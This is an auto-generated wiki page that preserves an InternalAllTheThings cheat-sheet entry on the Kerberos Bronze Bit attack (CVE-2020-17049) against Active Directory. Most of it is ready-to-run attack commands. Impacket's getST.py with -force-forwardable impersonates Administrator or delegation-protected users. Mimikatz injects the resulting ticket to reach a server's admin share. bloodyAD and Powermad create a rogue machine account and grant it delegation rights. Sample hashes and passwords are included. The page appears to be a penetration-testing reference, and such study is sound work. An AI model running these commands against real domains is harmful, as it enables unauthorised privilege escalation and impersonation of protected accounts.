---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kerberos - Bronze Bit

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-kerberos-bronze-bit` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-bronze-bit.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberos - Bronze Bit](../../topics/active-directory/kerberos-bronze-bit.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-kerberos-bronze-bit |
| name | Kerberos - Bronze Bit |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/kerberos-bronze-bit.md |

## Preserved Source Material

````yaml
_body: "# Kerberos - Bronze Bit\n\nCVE-2020-17049\n\n> An attacker can impersonate users which are not allowed to be delegated.\
  \ This includes members of the **Protected Users** group and any other users explicitly configured as **sensitive and cannot\
  \ be delegated**.\n> Patch is out on November 10, 2020, DC are most likely vulnerable until [February 2021](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049).\n\
  \n:warning: Patched Error Message : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`\n\nRequirements:\n\
  \n* Service account's password hash\n* Service account's with `Constrained Delegation` or `Resource Based Constrained Delegation`\n\
  * [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013)\n\n**Attack #1** - Bypass the `Trust this user\
  \ for delegation to specified services only – Use Kerberos only` protection and impersonate a user who is protected from\
  \ delegation.\n\n```powershell\n# forwardable flag is only protected by the ticket encryption which uses the service account's\
  \ password \n$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash>\
  \ test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable\n\n$ getST.py -spn cifs/Service2.test.local\
  \ -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4\
  \ test.local/Service1 -force-forwardable\n\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\"\
  \ exit\n\n# Access \"c$\"\nls \\\\service2.test.local\\c$\n```\n\n**Attack #2** - Write Permissions to one or more objects\
  \ in the AD\n\n* Windows/Linux:\n\n    ```ps1\n    bloodyAD -u user -p 'totoTOTOtoto1234*' -d test.local --host 10.100.10.5\
  \ add computer AttackerService 'AttackerServicePassword'\n    bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d\
  \ test.local add rbcd 'Service2$' 'AttackerService$'\n\n    # Execute the attack\n    getST.py -spn cifs/Service2.test.local\
  \ -impersonate User2 -dc-ip 10.100.10.5 -force-forwardable 'test.local/AttackerService$:AttackerServicePassword'\n    ```\n\
  \n* Windows only:\n\n    ```powershell\n    # Create a new machine account\n    Import-Module .\\Powermad\\powermad.ps1\n\
  \    New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText\
  \ -Force)\n    .\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\"\
  \ exit\n\n    # Set PrincipalsAllowedToDelegateToAccount\n    Install-WindowsFeature RSAT-AD-PowerShell\n    Import-Module\
  \ ActiveDirectory\n    Get-ADComputer AttackerService\n    Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount\
  \ AttackerService$\n    Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount\n\n    # Execute the attack\n\
  \    python .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5\
  \ -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable\n\
  \n    # Load the ticket\n    .\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null\n    ```\n\n## References\n\
  \n* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)\n\
  * [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)\n\
  * [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)"
_relative_path: active-directory/kerberos-bronze-bit.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-bronze-bit.md
````
